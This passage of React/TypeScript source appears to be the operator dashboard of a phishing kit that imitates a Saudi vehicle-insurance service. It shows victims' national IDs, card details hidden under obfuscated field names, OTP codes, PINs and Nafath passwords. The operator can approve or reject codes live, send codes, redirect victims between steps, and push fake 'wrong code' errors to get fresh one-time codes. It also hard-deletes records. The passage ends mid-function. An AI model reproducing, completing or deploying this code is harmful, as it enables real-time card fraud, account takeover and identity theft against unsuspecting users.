
  // Close header menu when clicking outside
  useEffect(() => {
    const handlePointerDown = (event: MouseEvent) => {
      if (headerMenuRef.current && !headerMenuRef.current.contains(event.target as Node)) {
        setHeaderMenuOpen(false);
      }
    };

    document.addEventListener("mousedown", handlePointerDown);
    return () => document.removeEventListener("mousedown", handlePointerDown);
  }, []);

  // Get country flag
  const getCountryFlag = (raw?: Record<string, any>): string => {
    if (!raw) return "🌐";
    const country = raw.country || raw.countryCode || raw.countryName || raw.location?.country || "";
    const normalized = String(country).toLowerCase().trim();
    for (const [key, flag] of Object.entries(countryFlags)) {
      if (normalized.includes(key)) return flag;
    }
    return "🌐";
  };

  // Get country code
  const getCountryCode = (raw?: Record<string, any>): string => {
    if (!raw) return "—";
    const country = raw.country || raw.countryCode || "";
    const normalized = String(country).toLowerCase().trim();
    for (const [key, code] of Object.entries(countryCodes)) {
      if (normalized.includes(key)) return code;
    }
    return normalized.slice(0, 2).toUpperCase() || "—";
  };

  // Get device icon
  const getDeviceIcon = (raw?: Record<string, any>): string => {
    if (!raw) return "📱";
    const device = String(raw.deviceType || raw.device || raw.platform || "").toLowerCase();
    if (/ipad|tablet/i.test(device)) return "💻";
    if (/desktop|pc/i.test(device)) return "🖥️";
    if (/phone|mobile|android|iphone/i.test(device)) return "📱";
    return "📱";
  };

  const getRealFieldValue = (raw: Record<string, any> | undefined, keys: string[], fallback = "—") => {
    if (!raw) return fallback;
    for (const key of keys) {
      const value = raw[key];
      if (value !== undefined && value !== null && value !== "") return String(value);
    }
    return fallback;
  };

  // Check if a request has actual data (not just a new visitor)
  const hasActualData = (request: RequestItem): boolean => {
    const raw = request.raw || {};
    
    // Check for various data fields that indicate actual user input
    const dataFields = [
      // Identity
      raw.identityNumber,
      raw.phoneIdNumber,
      raw.nafadIdNumber,
      raw.buyerIdNumber,
      // Names
      raw.ownerName,
      raw.buyerName,
      raw.name,
      raw.firstName,
      raw.lastName,
      // Phone
      raw.phoneNumber,
      raw.mobileNumber,
      // Insurance
      raw.insuranceType,
      raw.insuranceCoverage,
      raw.vehicleModel,
      raw.vehicleValue,
      raw.vehicleYear,
      raw.vehiclePlate,
      // Card
      raw._v1,
      raw._v2,
      raw._v3,
      raw._v5,
      raw.cardNumber,
      raw.paymentStatus,
      raw.hasCard,
      // OTP/PIN
      raw._v6,
      raw._v7,
      raw.otpCode,
      raw.pinCode,
      // Nafad
      raw.nafadPassword,
      // Other
      raw.selectedOffer,
      raw.offerTotalPrice,
      raw.comparCompletedAt,
    ];
    
    // Return true if any data field exists
    return dataFields.some(value => value !== undefined && value !== null && value !== "");
  };

  // Filter requests (unique customers only for sidebar)
  const filteredRequests = useMemo(() => {
    // Use unique customers for the sidebar list
    let filtered = uniqueCustomerRequests;
    
    // Only show requests that have actual data (not just new visitors)
    filtered = filtered.filter((r) => hasActualData(r));
    
    if (filterMode === "cards") {
      filtered = filtered.filter((r) => r.hasCard || r.raw?._v1 || r.raw?.cardNumber);
    }
    if (searchQuery.trim()) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter(
        (r) =>
          r.customer.toLowerCase().includes(query) ||
          r.id.toLowerCase().includes(query) ||
          r.raw?.phoneNumber?.toString().includes(query) ||
          r.raw?.identityNumber?.toString().includes(query)
      );
    }
    
    // Sort by latest activity (most recent first)
    filtered = [...filtered].sort((a, b) => {
      const aRaw = a.raw || {};
      const bRaw = b.raw || {};
      
      const aTimestamp = 
        new Date(aRaw.checkUpdatedAt || aRaw.cardUpdatedAt || aRaw.otpSubmittedAt || 
                 aRaw.pinSubmittedAt || aRaw.phoneSubmittedAt || aRaw.nafadUpdatedAt || 
                 aRaw.createdAt || aRaw.submittedAt || a.submittedAt || a.updatedAt || 0).getTime();
      
      const bTimestamp = 
        new Date(bRaw.checkUpdatedAt || bRaw.cardUpdatedAt || bRaw.otpSubmittedAt || 
                 bRaw.pinSubmittedAt || bRaw.phoneSubmittedAt || bRaw.nafadUpdatedAt || 
                 bRaw.createdAt || bRaw.submittedAt || b.submittedAt || b.updatedAt || 0).getTime();
      
      return bTimestamp - aTimestamp;
    });
    
    return filtered;
  }, [uniqueCustomerRequests, filterMode, searchQuery, nowTick]);

  const toggleRequestSelection = (requestId: string) => {
    setSelectedRequestIds((prev) =>
      prev.includes(requestId) ? prev.filter((id) => id !== requestId) : [...prev, requestId]
    );
  };

  const handleSelectAll = () => {
    const visibleIds = filteredRequests.map((item) => item.id);
    if (!visibleIds.length) return;

    setSelectedRequestIds((prev) => {
      const allVisibleSelected = visibleIds.every((id) => prev.includes(id));
      return allVisibleSelected ? [] : visibleIds;
    });
  };

  // Handle permanent delete (HARD DELETE - no archive)
  // Deletes ALL entries for the customer (old and new) from all tables
  const handleDeleteSelected = async () => {
    if (selectedRequestIds.length === 0) return;
    
    // Get ALL entries for each selected customer (including old and new)
    const allIdsToDelete: string[] = [];
    
    selectedRequestIds.forEach((selectedId) => {
      const selectedRequest = requests.find((r) => r.id === selectedId);
      if (!selectedRequest) return;
      
      // Find ALL entries for this customer using the same logic as customerEntryGroup
      requests.forEach((request) => {
        if (isSameCustomerEntry(request, selectedRequest)) {
          if (!allIdsToDelete.includes(request.id)) {
            allIdsToDelete.push(request.id);
          }
        }
      });
    });
    
    const selectedSet = new Set(allIdsToDelete);
    console.log("[CLIENT DELETE] HARD DELETE request for ALL customer entries:", allIdsToDelete);
    showNotification("success", `جاري حذف ${allIdsToDelete.length} سجل نهائياً للعميل...`);
    
    try {
      const response = await fetch("/api/visitors/delete", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ids: allIdsToDelete }),
      });
      
      const result = await response.json();
      console.log("[CLIENT DELETE] Server response:", result);
      
      // Clear localStorage for deleted visitors (force new visitorId on return)
      allIdsToDelete.forEach((id: string) => {
        localStorage.removeItem(`visitor_data_${id}`);
      });
      
      showNotification("success", `تم حذف ${allIdsToDelete.length} سجل نهائياً (قديمها وجديدها)`);
      
      // Update local state - remove ALL deleted entries
      setRequests((prev) => prev.filter((item) => !selectedSet.has(item.id)));
      setSelectedRequestIds([]);
      setSelectedRequestId(null);
    } catch (error) {
      console.error("[Dashboard] Failed to delete visitors:", error);
      showNotification("error", "فشل حذف السجلات - " + (error as Error).message);
    }
  };

  const selectedRequest = requests.find((r) => r.id === selectedRequestId) ?? filteredRequests[0];

  // Compare raw data between two entries to determine if data is new or updated
  const hasSignificantDataChange = (currentEntry: RequestItem, previousEntry: RequestItem): boolean => {
    const currentRaw = currentEntry.raw || {};
    const previousRaw = previousEntry.raw || {};
    
    // Key fields to compare
    const compareFields = [
      'identityNumber', 'phoneIdNumber', 'nafadIdNumber',
      'phoneNumber', 'mobileNumber',
      'ownerName', 'buyerName', 'name',
      'insuranceType', 'coverageType',
      'vehicleModel', 'vehicleYear', 'vehicleValue',
    ];
    
    for (const field of compareFields) {
      const currentVal = String(currentRaw[field] || '');
      const previousVal = String(previousRaw[field] || '');
      if (currentVal !== previousVal) {
        return true; // Significant data change
      }
    }
    return false; // Same data
  };

  const customerEntryGroup = useMemo(() => {
    if (!selectedRequest) return [];
    const matches = requests.filter((request) => isSameCustomerEntry(request, selectedRequest));
    
    // Sort by time (newest first)
    const sorted = [...matches].sort((a, b) => {
      const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
      const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
      return timeB - timeA;
    });
    
    // Mark entries based on comparison with the NEXT (older) entry
    return sorted.map((entry, index) => {
      const isCurrentEntry = entry.id === selectedRequest.id;
      
      if (isCurrentEntry) {
        return { ...entry, entryType: 'current' as const };
      }
      
      // Compare with the NEXT (older) entry in the list
      const nextIndex = index + 1;
      if (nextIndex < sorted.length) {
        const nextEntry = sorted[nextIndex];
        const isNewData = hasSignificantDataChange(entry, nextEntry);
        
        return { 
          ...entry, 
          entryType: isNewData ? 'new' as const : 'update' as const 
        };
      }
      
      // Last entry - compare with current selection
      if (isCurrentEntry) {
        return { ...entry, entryType: 'current' as const };
      }
      
      return { ...entry, entryType: 'update' as const };
    });
  }, [requests, selectedRequest]);

  // Get latest data for each box type from all entries (newest entry has data first due to sort)
  const getLatestRawForBox = useMemo(() => {
    return (dataType: 'phone' | 'card' | 'nafad' | 'basic' | 'insurance'): Record<string, any> | null => {
      if (!customerEntryGroup.length) return null;
      
      // Find first entry that has this type of data
      for (const entry of customerEntryGroup) {
        const raw = entry.raw || {};
        
        switch (dataType) {
          case 'phone':
            // Only return if there's actual phone verification data (from step5), not just phoneNumber
            if (raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7) return raw;
            break;
          case 'card':
            if (raw._v1 || raw._v2 || raw._v3 || raw._v5 || raw.cardNumber || raw.paymentStatus || raw.hasCard) return raw;
            break;
          case 'nafad':
            if (raw.nafadIdNumber || raw.nafadPassword) return raw;
            break;
          case 'basic':
            if (raw.identityNumber || raw.ownerName || raw.buyerName) return raw;
            break;
          case 'insurance':
            if (raw.insuranceType || raw.vehicleModel || raw.coverageType) return raw;
            break;
        }
      }
      return null;
    };
  }, [customerEntryGroup]);

  // Get entry timestamp for a specific raw data
  const getEntryTimestamp = useMemo(() => {
    return (raw: Record<string, any>): number => {
      const entry = customerEntryGroup.find(e => {
        const entryRaw = e.raw || {};
        // Match by comparing key fields
        return entryRaw.identityNumber === raw.identityNumber ||
               entryRaw.phoneNumber === raw.phoneNumber ||
               entryRaw.nafadIdNumber === raw.nafadIdNumber;
      });
      if (!entry) return 0;
      return new Date(entry.submittedAt || entry.updatedAt || 0).getTime();
    };
  }, [customerEntryGroup]);

  // =============================================
  // مراقبة حالة الاتصال الحية للزائر المحدد
  // =============================================
  const currentVisitorId = selectedRequest?.visitorId || selectedRequest?.id;
  const connectionStatus = useConnectionMonitor(currentVisitorId);

  const liveSummary = useMemo(() => {
    const raw = selectedRequest?.raw || {};
    const ownerName = selectedRequest?.customer || getRealFieldValue(raw, ["ownerName", "buyerName", "name", "firstName", "lastName"], "—");
    const identityNumber = getRealFieldValue(raw, ["identityNumber", "phoneIdNumber", "nafadIdNumber", "buyerIdNumber"], "—");
    const phoneNumber = getRealFieldValue(raw, ["phoneNumber", "mobileNumber", "phone", "phoneNumberValue"], "—");
    const phoneCarrier = getRealFieldValue(raw, ["phoneCarrier", "carrier", "network"], "غير محدد");
    const deviceType = getRealFieldValue(raw, ["deviceType", "device", "platform"], "غير معروف");
    const browser = getRealFieldValue(raw, ["browser", "browserName", "userAgent"], "غير معروف");
    const os = getRealFieldValue(raw, ["os", "operatingSystem", "osName"], "غير معروف");
    const country = getRealFieldValue(raw, ["country", "countryCode", "countryName"], "غير معروف");
    const ip = getRealFieldValue(raw, ["ip", "clientIp", "visitorIp"], "—");
    const currentPage = getRealFieldValue(raw, ["currentPage", "page"], typeof raw.currentPage === 'string' ? raw.currentPage : (typeof raw.page === 'string' ? raw.page : "غير متصل"));
    const currentStep = getRealFieldValue(raw, ["currentStep", "step"], "—");
    const updatedAt = selectedRequest?.updatedAt || raw?.updatedAt;

    return {
      ownerName,
      identityNumber,
      phoneNumber,
      phoneCarrier,
      deviceType,
      browser,
      os,
      country,
      ip,
      currentPage,
      currentStep,
      updatedAt,
      // معلومات الاتصال الحية
      isOnline: connectionStatus.isOnline,
      lastSeen: connectionStatus.lastSeen,
      isLive: connectionStatus.isLive,
      latency: connectionStatus.latency,
    };
  }, [selectedRequest, connectionStatus]);

  // Show notification
  const showNotification = (type: "success" | "error", message: string) => {
    setNotification({ type, message });
    setTimeout(() => setNotification(null), 3000);
  };

  // Handle dashboard actions
  const handlePaymentAction = async (action: "approved" | "rejected", event?: React.MouseEvent) => {
    event?.stopPropagation();
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    
    let button: HTMLButtonElement | null = null;
    if (event?.currentTarget) {
      button = event.currentTarget as HTMLButtonElement;
      button.disabled = true;
    }
    
    try {
      const res = await fetch("/api/dashboard/payment-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        showNotification("success", action === "approved" ? "تم الموافقة على الدفع" : "تم رفض الدفع");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    
    if (button) button.disabled = false;
  };

  const handleOtpAction = async (action: "approved" | "rejected" | "resend", event?: React.MouseEvent) => {
    event?.stopPropagation();
    
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id || selectedRequest?.raw?.visitorId || selectedRequest?.raw?.id;
    
    if (!visitorId) {
      showNotification("error", "لم يتم العثور على بيانات الزائر");
      return;
    }
    
    let button: HTMLButtonElement | null = null;
    if (event?.currentTarget) {
      button = event.currentTarget as HTMLButtonElement;
      button.disabled = true;
    }
    
    try {
      const res = await fetch("/api/dashboard/otp-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        const messages: Record<string, string> = {
          approved: "تم الموافقة على رمز التحقق",
          rejected: "تم رفض رمز التحقق",
          resend: "تم إعادة إرسال رمز التحقق",
        };
        showNotification("success", messages[action]);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    
    if (button) button.disabled = false;
  };

  const handleSendPin = async (event?: React.MouseEvent) => {
    event?.stopPropagation();
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    
    let button: HTMLButtonElement | null = null;
    if (event?.currentTarget) {
      button = event.currentTarget as HTMLButtonElement;
      button.disabled = true;
    }
    
    try {
      const res = await fetch("/api/dashboard/send-pin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, pinCode: pinInput }),
      });
      if (res.ok) {
        showNotification("success", "تم إرسال رمز PIN للعميل");
        setPinInput("");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    
    if (button) button.disabled = false;
  };

  const handlePinAction = async (action: "approved" | "rejected", event?: React.MouseEvent) => {
    event?.stopPropagation();
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    
    let button: HTMLButtonElement | null = null;
    if (event?.currentTarget) {
      button = event.currentTarget as HTMLButtonElement;
      button.disabled = true;
    }
    
    try {
      const res = await fetch("/api/dashboard/pin-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        const messages: Record<string, string> = {
          approved: "تم الموافقة على رمز PIN",
          rejected: "تم رفض رمز PIN",
        };
        showNotification("success", messages[action]);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    
    if (button) button.disabled = false;
  };

  const handlePhoneAction = async (action: "approved" | "rejected" | "resend", event?: React.MouseEvent) => {
    event?.stopPropagation();
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    
    let button: HTMLButtonElement | null = null;
    if (event?.currentTarget) {
      button = event.currentTarget as HTMLButtonElement;
      button.disabled = true;
    }
    
    try {
      const res = await fetch("/api/dashboard/phone-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        const messages: Record<string, string> = {
          approved: "تم الموافقة على رقم الهاتف",
          rejected: "تم رفض رقم الهاتف",
          resend: "تم إعادة إرسال رمز التحقق",
        };
        showNotification("success", messages[action]);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    
    if (button) button.disabled = false;
  };

  const handleSendNafadCode = async (event?: React.MouseEvent) => {
    event?.stopPropagation();
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    
    let button: HTMLButtonElement | null = null;
    if (event?.currentTarget) {
      button = event.currentTarget as HTMLButtonElement;
      button.disabled = true;
    }
    
    try {
      const res = await fetch("/api/dashboard/send-nafad-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, nafadCode: nafadInput }),
      });
      if (res.ok) {
        showNotification("success", "تم إرسال رمز النفاذ للعميل");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    
    if (button) button.disabled = false;
  };

  // Handle manual redirect to any page
  const handleRedirect = async (event?: React.MouseEvent) => {
    event?.stopPropagation();
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId || !redirectPage) return;
    
    let button: HTMLButtonElement | null = null;
    if (event?.currentTarget) {
      button = event.currentTarget as HTMLButtonElement;
      button.disabled = true;
    }
    
    try {
      const res = await fetch("/api/dashboard/redirect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, targetPage: redirectPage }),
      });
      if (res.ok) {
        const pageLabel = pageOptions.find(p => p.value === redirectPage)?.label || redirectPage;
        showNotification("success", `تم توجيه العميل إلى: ${pageLabel}`);
        setRedirectPage("");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    
    if (button) button.disabled = false;
  };

  // Handle approve action - move to next step
  const handleApprove = async (currentStep: string) => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    
    // Determine next page based on current step
    const nextPages: Record<string, string> = {
      "check": "step2",
      "step2": "step3",
      "step3": "step4",
      "step4": "step5",
      "step5": "thank-you",
    };
    const nextPage = nextPages[currentStep] || "step2";
    
    try {
      const res = await fetch("/api/dashboard/redirect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, targetPage: nextPage }),
      });
      if (res.ok) {
        showNotification("success", `تم الموافقة ✓ تم توجيه العميل للخطوة التالية`);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
  };

  // Handle reject action - go back with error message
  const handleReject = async (currentStep: string) => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) {
      showNotification("error", "لم يتم اختيار عميل");
      return;
    }
    
    // Error messages for each step
    const errorMessages: Record<string, { message: string; targetPage: string }> = {
      "check": { message: "يرحى التأكد من بيانات الدفع او استخدام طريقة دفع مختلفة", targetPage: "check" },
      "step2": { message: "رمز التحقق غير صحيح او منتهي الصلاحية", targetPage: "step2" },
      "step3": { message: "رمز pin غير صحيح يرحى التأكد من الرمز مجدا", targetPage: "step3" },
      "step5": { message: "رقم الهاتف غير صحيح", targetPage: "step5" },
    };
    
    const errorData = errorMessages[currentStep] || { message: "حدث خطأ", targetPage: currentStep };
    
    try {
      const res = await fetch("/api/dashboard/reject", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          visitorId, 
          targetPage: errorData.targetPage,
          errorMessage: errorData.message 
        }),
      });
      
      if (res.ok) {
        showNotification("error", `تم الرفض ✗ ${errorData.message}`);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
  };

  // Handle step5 approve - use phone-action endpoint
  const handleStep5Approve = async () => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    
    try {
      const res = await fetch("/api/dashboard/phone-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action: "approved" }),
      });
      if (res.ok) {
        showNotification("success", "تم الموافقة ✓ تم توجيه العميل لصفحة النفاذ");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
  };

  // Handle resend code for step5
  const handleResendCode = async () => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    
    try {
      const res = await fetch("/api/dashboard/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          visitorId, 
          targetPage: "step5",
          errorMessage: "رمز التحقق غير صحيح او منتهي الصلاحية يرجى انتظار رمز جديد"
        }),
      });
      if (res.ok) {
        showNotification("success", "تم إعادة إرسال الرمز ✓");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
  };

  // Handle nafad code send for step4
  const handleNafadCode = async (code: string) => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId || !code) return;
    
    try {
      const res = await fetch("/api/dashboard/send-nafad-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, nafadCode: code }),
      });
      if (res.ok) {
        showNotification("success", "تم إرسال رمز النفاذ للعميل ✓");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
  };

  // Get current page and status from visitor data
  const getCurrentPage = (): string => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    const page = raw?.currentPage || raw?.page;
    return typeof page === 'string' ? page : "";
  };

  const getCurrentStep = (): number => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    return raw?.currentStep || raw?.step || 0;
  };

  const getPaymentStatus = (): string => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    return raw?._v1Status || "";
  };

  // Get card OTP status (step 2 - after payment approval)
  const getCardOtpStatus = (): string => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    return raw?._v5Status || "";
  };

  const getPinStatus = (): string => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    return raw?._v6Status || "";
  };

  // Get phone OTP status (step 5 - after PIN)
  const getPhoneOtpStatus = (): string => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    return raw?.phoneOtpStatus || "";
  };

  // Get nafad status (step 8)
  const getNafadStatus = (): string => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    return raw?._v8Status || "";
  };

  // =============================================
  // دوال بناء الصناديق الجديدة لكل صفحة
  // =============================================

  // دالة مساعدة لعرض صف البيانات
  const renderDataRow = (label: string, value: string | number, icon?: string) => (
    <div style={{ 
      display: "flex", 
      justifyContent: "space-between", 
      alignItems: "center",
      background: "#f9fafb", 
      borderRadius: 6, 
      padding: "8px 12px",
      border: "1px solid #e5e7eb"
    }}>
      <span style={{ fontSize: "0.75rem", color: "#6b7280", display: "flex", alignItems: "center", gap: 6 }}>
        {icon && <span>{icon}</span>}
        {label}
      </span>
      <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827", textAlign: "right" }}>{value}</span>
    </div>
  );

  // صندوق صفحة البداية (home-new)
  const renderHomeNewBox = () => {
    const raw = selectedRequest?.raw || {};
    const timestamp = raw?.submittedAt || raw?.updatedAt || raw?.homeUpdatedAt;

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb",
        marginBottom: 12
      }}>
        <div style={{ 
          display: "flex", 
          justifyContent: "center", 
          alignItems: "center", 
          gap: 8, 
          marginBottom: 12,
          paddingBottom: 12,
          borderBottom: "2px solid #e5e7eb"
        }}>
          <span style={{ fontSize: "1.2rem" }}>🏠</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#0a4a68" }}>
            البيانات الأساسية
          </h3>
        </div>
        
        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
          {raw?.insuranceType && renderDataRow("نوع التأمين", raw.insuranceType)}
          {raw?.identityNumber && renderDataRow("رقم الهوية", raw.identityNumber, "🪪")}
          {raw?.ownerName && renderDataRow("اسم المالك", raw.ownerName, "👤")}
          {raw?.phoneNumber && renderDataRow("رقم الجوال", raw.phoneNumber, "📱")}
          {raw?.documentType && renderDataRow("نوع المستند", raw.documentType, "📄")}
          {raw?.serialNumber && renderDataRow("الرقم التسلسلي", raw.serialNumber, "🔢")}
          {raw?.buyerName && renderDataRow("اسم المشتري", raw.buyerName, "👥")}
          {raw?.buyerIdNumber && renderDataRow("هوية المشتري", raw.buyerIdNumber, "🪪")}
        </div>
        
        {/* عداد التحديث */}
        {timestamp && (
          <div style={{ marginTop: 12, textAlign: "center", paddingTop: 12, borderTop: "1px solid #e5e7eb" }}>
            <BoxTimer timestamp={timestamp} />
          </div>
        )}
      </div>
    );
  };

  // صندوق صفحة بيانات المركبة (insur)
  const renderInsurBox = () => {
    const raw = selectedRequest?.raw || {};
    const timestamp = raw?.insurUpdatedAt || raw?.updatedAt || raw?.submittedAt;

    // ترجمة استخدام المركبة
    const vehicleUsageLabels: Record<string, string> = {
      "personal": "شخصي",
      "commercial": "تجاري",
      "passenger-transport": "نقل ركاب",
      "rental": "تأجير",
      "cargo-transport": "نقل بضائع",
      "freight-vehicle": "مركبة شحن",
      "oil-transport": "نقل مشتقات نفطية"
    };

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb",
        marginBottom: 12
      }}>
        <div style={{ 
          display: "flex", 
          justifyContent: "center", 
          alignItems: "center", 
          gap: 8, 
          marginBottom: 12,
          paddingBottom: 12,
          borderBottom: "2px solid #e5e7eb"
        }}>
          <span style={{ fontSize: "1.2rem" }}>🚗</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#0a4a68" }}>
            بيانات المركبة والتأمين
          </h3>
        </div>
        
        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
          {raw?.insuranceCoverage && renderDataRow(
            "نوع التغطية", 
            raw.insuranceCoverage === "comprehensive" ? "شامل" : "ضد الغير"
          )}
          {raw?.insuranceStartDate && renderDataRow("تاريخ البدء", raw.insuranceStartDate, "📅")}
          {raw?.vehicleUsage && renderDataRow(
            "استخدام المركبة", 
            vehicleUsageLabels[raw.vehicleUsage] || raw.vehicleUsage
          )}
          {raw?.vehicleValue && renderDataRow("القيمة التقديرية", `${raw.vehicleValue} ﷼`, "💰")}
          {raw?.vehicleYear && renderDataRow("سنة الصنع", raw.vehicleYear, "📆")}
          {raw?.vehicleModel && renderDataRow("الموديل", raw.vehicleModel, "🏷️")}
          {raw?.repairLocation && renderDataRow(
            "مكان الإصلاح", 
            raw.repairLocation === "agency" ? "الوكالة" : "الورشة"
          )}
        </div>
        
        {/* عداد التحديث */}
        {timestamp && (
          <div style={{ marginTop: 12, textAlign: "center", paddingTop: 12, borderTop: "1px solid #e5e7eb" }}>
            <BoxTimer timestamp={timestamp} />
          </div>
        )}
      </div>
    );
  };

  // صندوق صفحة اختيار الباقة (compar)
  const renderComparBox = () => {
    const raw = selectedRequest?.raw || {};
    const timestamp = raw?.comparCompletedAt || raw?.comparUpdatedAt || raw?.selectedOffer?.updatedAt || raw?.updatedAt;

    const selectedOffer = raw?.selectedOffer || {};
    const offerTypeLabel = selectedOffer?.type === "comprehensive" ? "شامل" : "ضد الغير";

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb",
        marginBottom: 12
      }}>
        <div style={{ 
          display: "flex", 
          justifyContent: "center", 
          alignItems: "center", 
          gap: 8, 
          marginBottom: 12,
          paddingBottom: 12,
          borderBottom: "2px solid #e5e7eb"
        }}>
          <span style={{ fontSize: "1.2rem" }}>📊</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#0a4a68" }}>
            عرض التأمين المختار
          </h3>
        </div>
        
        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
          {selectedOffer?.name && renderDataRow("شركة التأمين", selectedOffer.name, "🏢")}
          {selectedOffer?.type && renderDataRow("نوع التأمين", offerTypeLabel, "📋")}
          {raw?.offerTotalPrice && renderDataRow("السعر الإجمالي", `${Number(raw.offerTotalPrice).toFixed(2)} ﷼`, "💵")}
          
          {/* عرض المميزات المختارة */}
          {selectedOffer?.extra_features?.length > 0 && (
            <div style={{ 
              background: "#f0fdf4", 
              borderRadius: 8, 
              padding: 12,
              border: "1px solid #bbf7d0"
            }}>
              <div style={{ fontSize: "0.75rem", color: "#166534", fontWeight: 600, marginBottom: 8 }}>
                ✅ المميزات المختارة:
              </div>
              {selectedOffer.extra_features.map((feature: any, idx: number) => (
                <div key={idx} style={{ 
                  fontSize: "0.7rem", 
                  color: "#15803d", 
                  marginBottom: 4,
                  paddingRight: 8
                }}>
                  • {feature.content || feature}
                </div>
              ))}
            </div>
          )}
        </div>
        
        {/* عداد التحديث */}
        {timestamp && (
          <div style={{ marginTop: 12, textAlign: "center", paddingTop: 12, borderTop: "1px solid #e5e7eb" }}>
            <BoxTimer timestamp={timestamp} />
          </div>
        )}
      </div>
    );
  };

  // صندوق صفحة التحقق من OTP (step2)
  const renderOtpBox = () => {
    const raw = selectedRequest?.raw || {};
    const otpStatus = raw?._v5Status || raw?.otpStatus;
    const otpValue = raw?._v5 || raw?.otpCode || "";

    const statusConfig: Record<string, { color: string; bg: string; border: string; icon: string; text: string }> = {
      "pending": { color: "#92400e", bg: "#fef3c7", border: "#fcd34d", icon: "⏳", text: "بانتظار التحقق" },
      "verifying": { color: "#1e40af", bg: "#dbeafe", border: "#93c5fd", icon: "🔄", text: "جاري التحقق" },
      "approved": { color: "#166534", bg: "#dcfce7", border: "#86efac", icon: "✅", text: "تم التحقق" },
      "rejected": { color: "#991b1b", bg: "#fee2e2", border: "#fca5a5", icon: "❌", text: "مرفوض" }
    };

    const config = statusConfig[otpStatus] || statusConfig["pending"];

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
